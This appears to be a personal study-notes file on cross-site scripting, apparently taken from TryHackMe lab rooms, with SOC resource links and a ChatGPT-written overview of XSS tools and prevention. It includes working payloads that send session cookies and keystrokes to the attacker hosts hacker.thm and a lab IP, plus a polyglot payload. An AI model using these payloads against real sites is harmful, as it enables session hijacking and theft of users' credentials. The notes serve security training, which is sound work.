# Cross Site Scripting

## Description

## Techniques

## Types of XSS:
* Stored XSS
* Reflected XSS
* DOM-Based XSS

https://tryhackme.com/room/xss

Common XSS Payloads:

* Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
* XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
* Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users

Proof Of Concept: <script>alert('XSS');</script>
Session Stealing: <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
Keylogger: <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
Business Logic: <script>user.changeEmail('attacker@hacker.thm');</script>

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

Stored XSS

the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page

DOM Based XSS: 

eval() = unsafe javascript method

Blind XSS

A popular tool for Blind XSS attacks is xsshunter

=========== SOC path ===========

https://feedly.com/i/welcome

https://thedfirreport.com/

https://app.any.run/tasks/a66178de-7596-4a05-945d-704dbf6b3b90/

punycode atacks

https://bazaar.abuse.ch/

https://malshare.com/

https://tdm.socprime.com/

Fuzzy hashing

https://ssdeep-project.github.io/ssdeep/index.html

https://attack.mitre.org/

pyramid of pain

XSS Polyglot

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

</textarea><script>alert('THM');</script>

</textarea><script>fetch('http://10.10.183.237:9001?cookie=' + btoa(document.cookie) );</script>

## Command Injection

Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with

https://github.com/payloadbox/command-injection-payload-list

. For example, the shell operators ;, & and && will combine two (or more) system commands and execute them both

window.location.hostname

(<script>alert("window.location.hostname")</script>)

<script>alert("window.location.hostname")</script>


<script>alert(document.cookie)</script>

<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>

## Resources

* https://netsec.expert/posts/xss-in-2021/
* https://chawdamrunal.medium.com/xss-cheat-sheet-e8b8261963c9
* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
* https://hackersonlineclub.com/cross-site-scripting-xss/
* https://0xhorizon.eu/cheat-sheet/xss/
* https://kipalog.com/posts/Some-XSS-payload



####### ChatGPT Stuff:

# Cross-Site Scripting (XSS)

## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a type of security vulnerability that occurs when an attacker injects malicious code into a website. This code is executed in the context of the affected website and can potentially steal sensitive information from the users who visit the site. There are two main types of XSS: stored and reflected.

### Stored XSS

Stored XSS, also known as persistent XSS, occurs when the malicious code is stored on the target server and served to all users who visit the affected pages. The code is stored in a database or other persistent data storage mechanism and is served to users without any validation or sanitization.

### Reflected XSS

Reflected XSS, also known as non-persistent XSS, occurs when the malicious code is included in a request to the server and reflected back to the user without proper validation or sanitization. The code is not stored on the server, but rather is executed in the context of the affected website each time the page is loaded.

## XSS Tools

XSS Validator: An open-source tool that can be used to identify and validate XSS vulnerabilities.

OWASP ZAP (Zed Attack Proxy): An open-source web application security scanner that can be used to identify and mitigate XSS vulnerabilities.

Burp Suite: An integrated platform for performing security testing of web applications that can be used to identify and mitigate XSS vulnerabilities.

Arachni: An open-source web application security scanner that can be used to identify and mitigate XSS vulnerabilities.

W3af: An open-source web application security scanner that can be used to identify and mitigate XSS vulnerabilities.

XSS Auditor: An online tool built into the Google Chrome browser that can be used to detect and prevent XSS attacks.

Acunetix Online Vulnerability Scanner: An online tool that can be used to scan web applications for XSS vulnerabilities.

Qualys FreeScan: An online tool that can be used to scan web applications for XSS vulnerabilities.

Netsparker Web Application Security Scanner: An online tool that can be used to scan web applications for XSS vulnerabilities.

Veracode: An online platform that provides a range of security services, including web application security testing, that can be used to identify and mitigate XSS vulnerabilities.S

## Impact of XSS

The impact of XSS can be severe and can include:

- Stealing of sensitive information such as passwords, cookies, and other session-related data
- Redirection of the user to malicious sites
- Modification of the content of the affected website to spread malicious messages or ads
- Execution of arbitrary code on the client-side, potentially compromising the client machine

## Prevention of XSS

To prevent XSS, it is important to properly validate and sanitize user input. This can be done in a number of ways, including:

- Escaping special characters in user input, such as angle brackets (< and >) and ampersands (&)
- Stripping out all HTML and JavaScript from user input
- Implementing a Content Security Policy (CSP) that restricts the types of content that can be executed in the context of the website

It is also important to keep all software up-to-date as many XSS vulnerabilities are discovered and patched in this manner.

## Conclusion

Cross-Site Scripting (XSS) is a serious security vulnerability that can have severe consequences for both users and website owners. It is important to properly validate and sanitize user input and to keep software up-to-date in order to prevent XSS attacks.

## XSS

* [XSS] (https://labs.f-secure.com/blog/getting-real-with-xss/)
